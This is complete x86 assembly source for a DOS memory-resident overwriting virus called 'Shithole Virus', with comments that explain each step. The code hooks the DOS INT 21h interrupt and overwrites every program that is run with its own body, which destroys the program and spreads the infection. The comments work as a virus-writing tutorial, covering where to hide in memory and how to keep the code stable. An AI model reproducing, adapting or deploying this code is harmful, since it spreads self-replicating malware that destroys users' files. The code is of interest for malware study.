                             Shithole Virus

;This virus basically overwrites anything executed with its own code.  Com
;files and exe files under 64k will function to spread the virus.  Exe's
;above 64k that have been overwritten will display the message "Program too big
;to fit in Memory."

;This small piece of code that seems to replicate itself to other files and 
;as a result render them worthless is the exclusive property of Yosha/DC. 

.model tiny
.code
.486
code_length equ offset finish - offset start
org 100h

start:
        
;Initially the stack contains a word-sized zero for com files.  What luck!      
  
        
        pop     es
        
;0500 is where we'll move the code.  We'll also use that as a residency check.
;We merely check the byte at 0000:0500 to see if it is a pop es.  Dual - purpose

;code is a good way to save space.
        mov     di,0500h
        cmp     byte ptr es:[di],07h            ;is it a pop es?                

        je      outtahere                       ;if so, we're in memory.
        
;Here we move our virus to 0000:0500h.  You could probably get away with 
;leaving out the cld, because it is usually cleared anyway.  Taking it out would

;make the virus less stable and prone to crashing, though.

;0000:0500 is a hole in memory between the interrupt table and dos's load 
;address.  You can't go past 0000:0700 without crashing dos.  You can probably
;go further back, though, and even overwrite the last parts of the interrupt 
;table if you're daring.

        mov     si,0100h
        mov     cx,code_length
        cld     ;<--this may not be necessary, but for stability's sake...
        rep     movsb

;copy the old int 21 value to the end of our virus in memory.  Note that after  
      
;a rep movsb, cx is 0.
        mov     ds,cx
        mov     si,0084h
        movsw
        movsw
;set new int 21.  I decided to use dos for this job.
        mov     ax,2521h
        mov     dx,offset int21handler+0400h
        int     21h
outtahere:
        push    es
        ret
 
;The handler jumps to here whenever a file tries to execute.

kill_it:
        pusha                   ;save all registers, 286+ only

        mov     ax,3d01h        ;open file, write access
        int     21h
        jc      done_killing    ;if error, exit    
        xchg    ax,bx           ;get handle in bx
         
        push    ds              ;save old ds (pusha doesn't save segment regs)
        push    cs              
        pop     ds              ;ds points to the segment containing our code

        mov     ah,40h          ;write to file
        mov     dx,0500h
        mov     cx,code_length
        int     21h
        
;I found that not closing the file causes a crash.
        mov     ah,3eh          ;close the file
        int     21h
        
        pop     ds              ;restore ds
done_killing:
        popa                    ;restore all registers, 286+ only
        jmp     jump

int21handler:
        cmp     ah,4bh
        je      kill_it
jump:    
        db      0eah            ;byte signifying a far jump.
old21: 
finish:
        end     start
